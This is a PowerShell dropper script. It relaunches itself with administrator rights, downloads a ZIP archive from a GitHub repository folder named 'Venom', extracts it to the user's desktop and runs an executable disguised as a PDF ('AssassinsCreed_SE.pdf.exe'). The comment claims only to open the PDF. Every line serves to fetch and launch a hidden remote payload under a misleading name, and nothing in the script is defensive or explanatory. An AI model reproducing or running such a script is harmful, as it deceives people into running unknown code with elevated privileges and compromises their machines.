# Path to the ZIP file and the destination path on the desktop
$zipUrl = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip"
$zipFilePath = "$env:TEMP\AssassinsCreed_SE.zip"
$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "AssassinsCreed_SE")
$extractedPath = "$env:TEMP\AssassinsCreed_SE"

# Function to check if running with elevated privileges
function Test-IsAdmin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Ensure the script is running with elevated privileges
if (-not (Test-IsAdmin)) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    Exit
}

# Download the ZIP file
Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath

# Create the destination directory if it doesn't exist
if (-not (Test-Path -Path $extractedPath)) {
    New-Item -Path $extractedPath -ItemType Directory
}

# Extract the ZIP file
Expand-Archive -Path $zipFilePath -DestinationPath $extractedPath -Force

# Ensure the desktop directory exists
if (-not (Test-Path -Path $desktopPath)) {
    New-Item -Path $desktopPath -ItemType Directory
}

# Move the extracted files to the Desktop folder
Get-ChildItem -Path $extractedPath | Move-Item -Destination $desktopPath -Force

# Open the extracted PDF file
Start-Process -FilePath "$desktopPath\AssassinsCreed_SE.pdf.exe"
